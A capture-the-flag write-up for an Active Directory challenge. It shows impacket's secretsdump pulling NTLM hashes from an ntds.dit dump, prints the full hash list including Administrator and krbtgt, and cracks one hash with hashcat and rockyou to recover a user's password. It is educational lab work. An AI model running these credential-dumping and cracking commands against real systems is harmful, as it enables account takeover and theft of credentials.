# Oh No! They dumped our secrets!

## Instructions

Oh no! You found a dump of the Active Directory database in C:\temp on your domain controller. See if there's any enabled user accounts with weak passwords that the enemy may discover. Be sure to let us know which user had a weak password, and what the password is in the following format FLAG{username:password}.

## Solutions

LETS GOo this is being written at 3 am after the ctf so apologies in advance.

We were given two files, the `ntds.dit` and `SYSTEM`. Given the challenge asks for insecure passwords we're looking for password hashes, and ntds.dit contains those! Using impacket we can extract ntlm hashes for our users which we can then crack with good ol' john or hashcat.

```sh
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
```

This gives us a file filled with user info and password hashes, which can be broken down as username: (Administrator), userid: (500) , lmhash: (aad3b435b51404eeaad3b435b51404ee) and ntlmhash: (3f29b6875fdf3169667d2bf6aad24101).

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3f29b6875fdf3169667d2bf6aad24101:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
vagrant:1001:aad3b435b51404eeaad3b435b51404ee:e4e9637a97ac7e22c01a65e66cdf09dd:::
DC1$:1002:aad3b435b51404eeaad3b435b51404ee:49dd1c81ab4def69034f8b7e3e844c44:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:20c98e40fd6b26928d7baacd3b78d1b5:::
janet:1106:aad3b435b51404eeaad3b435b51404ee:9e13fc4028a98ac6c6accad6d622ea58:::
paula:1107:aad3b435b51404eeaad3b435b51404ee:b61ebaf5155b25e5cbf15a0f1e46b315:::
phyllis:1108:aad3b435b51404eeaad3b435b51404ee:fad72f66719509d816e1584dfa04fced:::
thomasz:1109:aad3b435b51404eeaad3b435b51404ee:4fc491eb90e637c3e35b17d2fa39f0be:::
trenton:1110:aad3b435b51404eeaad3b435b51404ee:477c9029fbd8818f933598608a077127:::
vanessa:1111:aad3b435b51404eeaad3b435b51404ee:db2f349340c18058b6953dc7b31bd343:::
warren:1114:aad3b435b51404eeaad3b435b51404ee:13fd14a72ede72673312ffef1af4c6c0:::
hishani:1115:aad3b435b51404eeaad3b435b51404ee:84fc0cade72ac6454b4d47c13f9b3206:::
george:1116:aad3b435b51404eeaad3b435b51404ee:bf09559a98e5646a181926903886b709:::
```

Due to me being a gremlin and using wsl, both hashcat and jack were playing up on windows, so I had to use hashcat on linux. We just wanted the ntlm hashes so we remove all the other data 

```shell
cat ntlm-extract.ntds | cut -d : -f 4 > JustTheHashes.txt
~/tools/hashcat-6.2.4/hashcat.bin -m 1000 ./JustTheHashes.txt /home/social_anthrax/tools/password_lists/rockyou.txt
```

And viola, we have the password in all it's glory `13fd14a72ede72673312ffef1af4c6c0:lizard11`, doing a quick reverse search we get the password user to be warren

**flag{warren:lizard11}**




